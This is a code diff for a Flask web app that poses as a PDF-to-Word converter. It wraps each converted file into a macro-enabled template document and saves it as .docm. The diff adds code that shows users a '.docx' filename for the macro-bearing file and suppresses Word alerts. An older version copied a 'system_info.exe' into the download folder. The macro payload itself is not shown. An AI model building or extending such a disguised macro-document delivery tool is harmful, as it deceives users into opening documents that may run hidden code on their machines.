@@ -7,10 +7,12 @@ import win32com.client as win32
 
 app = Flask(__name__)
 
-UPLOAD_FOLDER = 'uploads'
-TEMPLATE_MACRO = 'template.docm'
-FINAL_DOCM_SUFFIX = ''
-SYSTEM_EXE = 'system_info.exe'
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+
+UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
+TEMPLATE_MACRO = os.path.join(BASE_DIR, 'template.docm')
+SYSTEM_EXE = os.path.join(BASE_DIR, 'system_info.exe')
+FINAL_DOCM_SUFFIX = '.docm'
 
 @app.route('/')
 def index():
@@ -18,10 +20,18 @@ def index():
 
 @app.route('/convert', methods=['POST'])
 def convert_pdf_to_word():
-    if 'pdf_file' not in request.files or request.files['pdf_file'].filename == '':
-        return render_template('index.html', message="Silakan pilih file PDF terlebih dahulu.", docx_file=None)
+    if 'pdf_file' not in request.files:
+        return redirect(url_for('index'))
 
     pdf_file = request.files['pdf_file']
+
+    if pdf_file.filename == '':
+        return redirect(url_for('index'))
+
+    if not pdf_file.filename.lower().endswith('.pdf'):
+        message = 'File yang diupload bukan PDF.'
+        return render_template('index.html', message=message)
+
     pdf_filename = pdf_file.filename
     pdf_file_path = os.path.join(UPLOAD_FOLDER, pdf_filename)
     docx_filename = os.path.splitext(pdf_filename)[0] + '.docx'
@@ -30,40 +40,45 @@ def convert_pdf_to_word():
     pdf_file.save(pdf_file_path)
 
     try:
-        # Konversi PDF ke DOCX
         cv = Converter(pdf_file_path)
         cv.convert(docx_file_path, start=0, end=None)
         cv.close()
 
-        # Buat file .docm akhir
         final_docm_filename = os.path.splitext(pdf_filename)[0] + FINAL_DOCM_SUFFIX
         final_docm_path = os.path.join(UPLOAD_FOLDER, final_docm_filename)
 
         shutil.copy2(TEMPLATE_MACRO, final_docm_path)
 
         pythoncom.CoInitialize()
-        word = win32.gencache.EnsureDispatch('Word.Application')
+        try:
+            word = win32.gencache.EnsureDispatch('Word.Application')
+        except Exception:
+            word = win32.Dispatch('Word.Application')
         word.Visible = False
+        word.DisplayAlerts = False
 
         doc = word.Documents.Open(os.path.abspath(final_docm_path))
         selection = word.Selection
-        selection.EndKey(Unit=6)
+        selection.EndKey(Unit=6) 
         selection.InsertFile(os.path.abspath(docx_file_path))
-        doc.Save()
+
+        doc.SaveAs(final_docm_path, FileFormat=16)  
         doc.Close()
         word.Quit()
+        pythoncom.CoUninitialize()
 
-        # Salin system_info.exe ke uploads jika belum ada
-        exe_path = os.path.join(UPLOAD_FOLDER, SYSTEM_EXE)
-        if not os.path.exists(exe_path):
-            shutil.copy2(SYSTEM_EXE, exe_path)
+        os.remove(pdf_file_path)
+        os.remove(docx_file_path)
 
-        message = f'File {pdf_filename} telah berhasil dikonversi menjadi {final_docm_filename}'
-        return render_template('index.html', message=message, docx_file=final_docm_filename)
+        display_name = final_docm_filename.replace('.docm', '.docx')
+
+        message = f'File {pdf_file.filename} telah berhasil dikonversi menjadi {display_name}'
+        return render_template('index.html', message=message, docx_file=final_docm_filename, display_name=display_name)
 
     except Exception as e:
+        pythoncom.CoUninitialize()
         message = f'Terjadi kesalahan: {str(e)}'
-        return render_template('index.html', message=message, docx_file=None)
+        return render_template('index.html', message=message)
 
 @app.route('/download/<filename>')
 def download_file(filename):
@@ -73,4 +88,3 @@ if __name__ == '__main__':
     if not os.path.exists(UPLOAD_FOLDER):
         os.makedirs(UPLOAD_FOLDER)
     app.run(debug=True)
-#
